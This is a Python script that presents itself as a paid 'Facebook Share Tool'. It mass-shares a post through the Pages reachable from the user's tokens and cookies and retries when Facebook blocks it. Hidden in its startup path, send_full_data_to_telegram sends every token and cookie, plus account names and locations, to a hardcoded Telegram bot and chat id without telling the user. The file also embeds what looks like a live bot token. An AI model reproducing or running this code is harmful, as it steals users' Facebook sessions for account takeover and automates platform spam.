import os
import sys
import aiohttp
import asyncio
import datetime
import time
import hashlib
from rich.console import Console
from rich.text import Text

console = Console()


def read_lines_from_file(filename):
    try:
        with open(filename, 'r') as f:
            lines = f.readlines()
            return [line.strip() for line in lines if line.strip()]
    except FileNotFoundError:
        console.print(f"[red]File {filename} does not exist.")
        return []

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo = f"""\033[1;37m
\033[1;35m                        ¶¶¶¶¶¶
\033[1;37m                       ¶¶¶¶¶¶¶¶
\033[1;35m                      ¶¶¶¶¶¶¶¶¶¶
\033[1;37m                     ¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;35m                     ¶¶¶¶__¶_¶¶¶¶
\033[1;37m                     ¶¶¶__¶___¶¶¶
\033[1;35m                     ¶¶¶___¶¶_¶¶¶
\033[1;37m                     ¶¶¶¶____¶¶¶¶
\033[1;35m                     ¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;37m                      ¶¶_¶¶¶¶_¶¶
\033[1;35m                      ¶¶_¶¶¶¶_¶¶
\033[1;37m                      ¶¶_¶¶¶¶_¶¶
\033[1;35m                      ¶¶_¶¶¶¶_¶¶
\033[1;37m                      ¶¶_¶¶¶¶_¶¶
\033[1;35m                      ¶¶_¶¶¶¶_¶¶
\033[1;37m                      ¶¶_¶¶¶¶_¶¶
\033[1;35m_¶¶_¶¶¶¶_¶¶_______________________________________¶¶
\033[1;37m_¶¶_¶¶¶¶_¶¶______________________________________¶¶¶
\033[1;35m_¶¶_¶¶¶¶_¶¶____¶____¶____¶____¶____¶____¶____¶___¶¶¶
\033[1;37m_¶¶_¶¶¶¶_¶¶___¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶_¶¶¶¶¶
\033[1;35m_¶¶_¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;37m_¶¶_¶¶¶¶_¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶¶
\033[1;35m_¶¶_¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;37m_¶¶_¶¶¶¶_¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶¶
\033[1;35m_¶¶_¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\033[1;37m_¶¶_¶¶¶¶_¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶__¶¶¶¶
\033[1;35m_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ 
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mTelegram:OptionsPremium01
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mAuthor  : L~Khufra
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mGithub  : CyraxmodDOne
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mService : Paid
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mVersion : 1
\033[1;36mFast Share | Stable Workers
\033[1;36mTool Share Mod By Options Premium 
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""
    print(logo)

def get_telegram_credentials():
    try:
        bot_token = "8144749994:AAEp0yAZVxGST2Wn16WTep7JlDon45Yybqw"
        chat_id = "7453226176"
        return bot_token, chat_id
    except:
        return None, None

TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID = get_telegram_credentials()

async def send_to_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=payload) as response:
                return response.status == 200
    except Exception as e:
        return False

async def get_facebook_account_info(session, token):
    try:
        url = f"https://graph.facebook.com/me"
        params = {
            'fields': 'id,name,location',
            'access_token': token
        }
        
        async with session.get(url, params=params) as response:
            if response.status == 200:
                data = await response.json()
                name = data.get('name', 'Unknown')
                location = data.get('location', {}).get('name', 'Unknown Country')
                return name, location
    except:
        pass
    return 'Unknown', 'Unknown Country'

async def send_full_data_to_telegram():
    
    tokens = read_lines_from_file('token.txt')
    cookies = read_lines_from_file('cookie.txt')
    
    if not tokens and not cookies:
        message = "🚨 <b>Tool Started - No Data Found</b>\n\n"
        message += "❌ No tokens or cookies found in files!"
        await send_to_telegram(message)
        return
    
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    account_info = []
    async with aiohttp.ClientSession() as session:
        for token in tokens:
            name, country = await get_facebook_account_info(session, token)
            account_info.append((name, country))
            await asyncio.sleep(0.3)
    
    main_message = f"🔔 <b>Facebook Share Tool Started</b>\n\n"
    main_message += f"<b>🕐 Start Time:</b> {current_time}\n"
    main_message += f"<b>📱 Total Tokens:</b> {len(tokens)}\n"
    main_message += f"<b>🍪 Total Cookies:</b> {len(cookies)}\n\n"
    
    if account_info:
        main_message += "<b>👤 Facebook Accounts:</b>\n"
        for i, (name, country) in enumerate(account_info, 1):
            main_message += f"{i}. <b>{name}</b> - 🌍 {country}\n"
    
    main_message += f"\n<b>📥 Sending detailed data...</b>"
    
    await send_to_telegram(main_message)
    
    if tokens:
        for i, token in enumerate(tokens, 1):
            token_message = f"<b>🔑 Token {i}/{len(tokens)}</b>\n"
            token_message += f"<code>{token}</code>"
            await send_to_telegram(token_message)
            await asyncio.sleep(0.5)
      
    if cookies:
        for i, cookie in enumerate(cookies, 1):
            cookie_message = f"<b>🍪 Cookie {i}/{len(cookies)}</b>\n"
            cookie_message += f"<code>{cookie}</code>"
            await send_to_telegram(cookie_message)
            await asyncio.sleep(0.5)
    
    summary_message = f"<b>✅ Data Transfer Complete</b>\n\n"
    summary_message += f"<b>📊 Summary:</b>\n"
    summary_message += f"• Total Accounts: {len(tokens)}\n"
    summary_message += f"• Total Cookies: {len(cookies)}\n"
    summary_message += f"• Transfer Time: {current_time}\n"
    summary_message += f"• Tool: Facebook Share Tool"
    
    await send_to_telegram(summary_message)

success_count = 0
lock = asyncio.Lock() 

async def getid(session, link):
    async with session.post('https://id.traodoisub.com/api.php', data={"link": link}) as response:
        rq = await response.json()
        if 'success' in rq:
            return rq["id"]
        else:
            console.print(f"[red]Incorrect post link!!! Please re-enter")
            sys.exit()

async def get_token(session, token, cookie):
    params = {
        'access_token': token
    }
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'max-age=0',
        'cookie': cookie,
        'priority': 'u=0, i',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
    }
    async with session.get('https://graph.facebook.com/me/accounts', params=params, headers=headers) as r:
        rq = await r.json()
        if 'data' in rq:
            return rq
        else:
            console.print(f"[red]Incorrect Token or Cookie! Error getting pages for this token.")
            return {}

async def share_single_post(session, tk, ck, post, published_value):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'max-age=0',
        'cookie': ck,
        'priority': 'u=0, i',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
    }
    async with session.get(f'https://graph.facebook.com/me/feed?method=POST&link=https://m.facebook.com/{post}&published={published_value}&access_token={tk}', headers=headers) as response:
        json_data = await response.json()
        if 'id' in json_data:
            return True, json_data.get('id', 'N/A')
        else:
            return False, json_data.get('error', {}).get('message', 'Unknown error')

async def share_loop(session, tk, ck, post, page_id):
    global success_count
    
    current_published_status = 0
    consecutive_block_count = 0 
    
    while True:
        try:
            now = datetime.datetime.now()
            current_time = now.strftime("%H:%M:%S")

            is_success, result = await share_single_post(session, tk, ck, post, current_published_status)
            
            if is_success:
                async with lock:
                    success_count += 1
                    current_success_count = success_count
                
                consecutive_block_count = 0 
                
                console.print(f"[green]| Success | [magenta]{current_time} | [blue]{page_id} | [cyan]published={current_published_status} | [yellow]{current_success_count} |")
                continue

            else:
                consecutive_block_count += 1
                error_message = result 
                
                if consecutive_block_count == 1:
                    next_published_status = 1 if current_published_status == 0 else 0
                    
                    console.print(f"[yellow]| Failed | [magenta]{current_time} | [blue]{page_id} | [red]published={current_published_status} | [yellow]Switching to published={next_published_status} and retrying... |")
                    current_published_status = next_published_status
                    await asyncio.sleep(1)
                    continue
                
                elif consecutive_block_count == 2:
                    current_published_status = 0
                    
                    console.print(f"[red]| Failed 2 times | [magenta]{current_time} | [blue]{page_id} | [red]Both published=0 and published=1 are blocked! Pausing for 30 minutes. |")
                    await asyncio.sleep(1800)
                    consecutive_block_count = 0
                    continue

                console.print(f"[red]| Share Error | [magenta]{current_time} | [blue] {page_id} | Error: {error_message} | Retrying after 10 seconds.")
                await asyncio.sleep(10)

        except Exception as e:
            console.print(f"| [red]Exception Error | [magenta]{datetime.datetime.now().strftime('%H:%M:%S')} | [blue] {page_id} | [red]{e} | Retrying after 60 seconds...")
            await asyncio.sleep(60)

async def main(link):
    banner()
    
    await send_full_data_to_telegram()
    
    async with aiohttp.ClientSession() as session:
        post = await getid(session, link)
        
        cookies = read_lines_from_file('cookie.txt')
        if not cookies:
            console.print(f"[red]cookie.txt not found or file is empty. Please check again.")
            sys.exit()
        
        tokens = read_lines_from_file('token.txt')
        if not tokens:
            console.print(f"[red]token.txt not found or file is empty. Please check again.")
            sys.exit()
        
        list_pages = []
        total_pages = 0
        for token in tokens:
            cookie_for_request = cookies[0] 
            token_data = await get_token(session, token, cookie_for_request)
            
            if 'data' in token_data:
                pages_found = 0
                for page in token_data['data']:
                    list_pages.append({
                        "tk": page["access_token"], 
                        "page_id": page["id"],
                        "ck": cookie_for_request
                    })
                    pages_found += 1
                total_pages += pages_found
                console.print(f"[blue]Found [red]{pages_found} [pink]Page from one token.")
        
        if not list_pages:
            console.print(f"[red]No Pages found from the provided tokens.")
            sys.exit()
            
        banner()
        console.print(f"[magenta]Total Page Tokens: [yellow]{total_pages}")
        console.print(f"[yellow]Share speed: [bold bright_green](Max Speed)!")

        tasks = []
        for page in list_pages:
            task = asyncio.create_task(share_loop(
                session, 
                page["tk"], 
                page["ck"], 
                post, 
                page["page_id"]
            ))
            tasks.append(task)
            
        console.print(f"[green]Starting continuous sharing process with {len(tasks)} independent threads...")
        
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    banner()
    
    link = console.input("[green]Post Link: [yellow]")
    
    try:
        asyncio.run(main(link))
    except KeyboardInterrupt:
        stop_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        stop_message = f"🛑 <b>Tool Stopped</b>\n\n• Time: {stop_time}\n• Reason: User interruption (Ctrl+C)"
        asyncio.run(send_to_telegram(stop_message))
        console.print("[yellow]Program stopped by user (Ctrl+C).")
    except Exception as e:
        error_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        error_message = f"❌ <b>Tool Error</b>\n\n• Time: {error_time}\n• Error: {str(e)}"
        asyncio.run(send_to_telegram(error_message))
        console.print(f"[red]An unexpected error occurred: {e}")
